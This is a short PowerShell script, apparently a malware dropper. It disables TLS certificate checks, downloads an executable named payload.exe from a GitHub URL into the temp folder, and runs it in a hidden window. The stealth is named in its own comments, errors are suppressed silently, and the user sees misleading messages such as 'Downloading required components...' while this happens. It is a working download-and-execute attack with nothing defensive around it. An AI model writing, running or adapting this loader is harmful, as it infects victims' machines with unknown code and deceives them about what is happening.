# SSL/TLS Bypass - Critical for successful web requests
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Function to download and execute payload
function Invoke-PayloadDownload {
    $payloadUrl = "https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/payload.exe"
    $localPath = Join-Path $env:TEMP "payload.exe"
    
    try {
        # Download the payload
        Write-Host "Downloading required components..." -ForegroundColor Yellow
        Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath -UseBasicParsing
        
        if (Test-Path $localPath) {
            # Execute the payload silently
            $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processStartInfo.FileName = $localPath
            $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $processStartInfo.CreateNoWindow = $true
            $processStartInfo.UseShellExecute = $false
            
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $processStartInfo
            $process.Start() | Out-Null
            
            Write-Host "Operation completed successfully." -ForegroundColor Green
        } else {
            Write-Host "Download failed. Please check your connection." -ForegroundColor Red
        }
    }
    catch {
        Write-Host "Error occurred: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Main execution block with error handling
try {
    # Additional stealth measures
    $currentPath = Get-Location
    Set-Location $env:TEMP
    
    # Execute download function
    Invoke-PayloadDownload
    
    # Cleanup and return to original location
    Set-Location $currentPath
}
catch {
    # Silent error handling - no visible alerts
    exit
}
